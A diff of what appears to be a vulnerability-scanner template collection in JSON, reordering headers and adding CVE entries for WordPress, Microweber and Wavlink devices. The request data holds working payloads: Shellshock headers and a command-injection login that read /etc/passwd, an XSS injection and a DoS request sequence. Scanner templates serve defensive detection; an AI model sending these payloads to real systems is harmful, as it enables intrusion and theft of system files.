@@ -3354,9 +3354,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -11272,8 +11272,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -14401,6 +14401,21 @@
       ]
     },
     {
+      "id": "CVE-2021-24370",
+      "info": {
+        "name": "Fancy Product Designer WordPress plugin - Remote Code Execution (Detection)",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24387",
       "info": {
         "name": "Real Estate 7 WordPress Theme < 3.1.1 - Unauthenticated Reflected XSS",
@@ -16326,8 +16341,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -18484,6 +18499,22 @@
       ]
     },
     {
+      "id": "CVE-2022-0968",
+      "info": {
+        "name": "Microweber < 1.2.12 - Integer Overflow (DOS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /api/user_login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "GET /admin/view:modules/load_module:users/edit-user:2 HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /api/user/2 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nthumbnail=&id=2&token={{form_token}}&_method=PATCH&username={{user}}&verify_password=&first_name={{payload}}&last_name=test&email={{email}}&phone=&is_admin=0&is_active=1&basic_mode=0&api_key=\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-1020",
       "info": {
         "name": "WordPress WooCommerce <3.1.2 - Arbitrary Function Call",
@@ -20011,6 +20042,20 @@
         {
           "raw": [
             "GET /set_safety.shtml?r=52300 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-34048",
+      "info": {
+        "name": "Wavlink WN533A8 - Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /cgi-bin/login.cgi HTTP/1.1\nHost: {{Hostname}}\n\nnewUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=x\");alert(9);x=(\"&homepage=main.html&sysinitpage=sysinit.shtml&wizardpage=wiz.shtml&hostname=0.0.0.1&key=M94947765&password=ab4e98e4640b6c1ee88574ec0f13f908&lang_select=en\n"
           ]
         }
       ]
